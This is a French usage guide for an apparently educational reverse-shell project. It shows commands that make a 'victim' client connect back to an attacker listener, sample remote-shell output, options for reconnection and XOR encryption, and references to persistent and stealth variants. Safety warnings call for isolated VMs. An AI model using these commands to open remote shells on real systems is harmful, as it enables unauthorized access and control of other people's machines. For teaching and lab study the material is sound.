# Guide d'Utilisation - Reverse Shell Project

## 🚀 Démarrage Rapide

### Scénario 1 : Test Local (Même Machine)

```bash
# Terminal 1 : Lancer le serveur
./build/server 4444

# Terminal 2 : Lancer le client
./build/client 127.0.0.1 4444
```

**Résultat** : Vous obtenez un shell dans Terminal 1.

---

### Scénario 2 : Réseau Local (Deux Machines)

**Machine Attaquant (10.0.0.1)** :
```bash
./build/server 4444
[*] Listening on 0.0.0.0:4444
[*] Waiting for client connection...
```

**Machine Victime (10.0.0.50)** :
```bash
./build/client 10.0.0.1 4444
[*] Connecting to 10.0.0.1:4444...
[+] Connected!
```

**Machine Attaquant** :
```
[+] Client connected from 10.0.0.50
[shell]$ whoami
user
[shell]$ pwd
/home/user
[shell]$ exit
[*] Client disconnected
```

---

## 🔐 Avec Chiffrement

### Exemple Basic (version à créer)

```bash
# Server avec clé XOR
./build/server -p 4444 -k "MySecretKey123"

# Client avec même clé
./build/client -h 10.0.0.1 -p 4444 -k "MySecretKey123"
```

---

## 📊 Options de Ligne de Commande

### Server

```bash
./build/server [OPTIONS]

OPTIONS:
  -p PORT       Port d'écoute (défaut: 4444)
  -l LOGFILE    Fichier de log (défaut: server.log)
  -v            Mode verbose
  -h            Afficher aide
```

### Client

```bash
./build/client [OPTIONS] <SERVER_IP>

OPTIONS:
  -p PORT       Port du serveur (défaut: 4444)
  -r DELAY      Délai reconnexion en secondes (défaut: 60)
  -v            Mode verbose
  -h            Afficher aide

EXEMPLE:
  ./build/client 10.0.0.1
  ./build/client -p 5555 -r 30 192.168.1.100
```

---

## 🎯 Cas d'Usage Pédagogiques

### 1. Comprendre les Sockets

Utilisez `basic_shell.c` pour voir le minimum de code nécessaire.

### 2. Tester la Reconnexion

```bash
# Lancer client
./build/client 10.0.0.1 4444

# Arrêter server (Ctrl+C)
# Relancer server
# → Client se reconnecte automatiquement
```

### 3. Observer le Trafic Réseau

```bash
# Terminal 1 : Capturer trafic
sudo tcpdump -i lo port 4444 -A

# Terminal 2 : Server
./build/server 4444

# Terminal 3 : Client
./build/client 127.0.0.1 4444
```

Vous verrez les commandes en clair sur tcpdump (d'où l'importance du chiffrement).

---

## ⚠️ Sécurité

### Tests Sécurisés

**Environnement Recommandé** :
```
VM 1 (Attaquant) ←──LAN Isolé──→ VM 2 (Victime)
       ↓                              ↓
  Pas d'Internet                 Pas d'Internet
  
Réseau virtuel isolé (VirtualBox/VMware)
```

### NE JAMAIS

❌ Tester sur machines de production
❌ Tester sur réseaux d'entreprise/école sans autorisation
❌ Laisser le serveur ouvert sur Internet
❌ Utiliser sur systèmes tiers

### TOUJOURS

✅ Tests sur VOS machines
✅ Environnement isolé (VM)
✅ But pédagogique/recherche
✅ Documentation des tests

---

## 📚 Exemples Avancés

Consultez `examples/` pour :
- `basic_shell.c` - Version minimale
- `encrypted_shell.c` - Avec XOR
- `persistent_shell.c` - Avec reconnexion
- `stealth_shell.c` - Furtif (jitter, etc.)

Compilez avec :
```bash
make examples
ls build/examples/
```

---

*Guide d'utilisation - Reverse Shell Project*
*Usage Éducatif Uniquement*

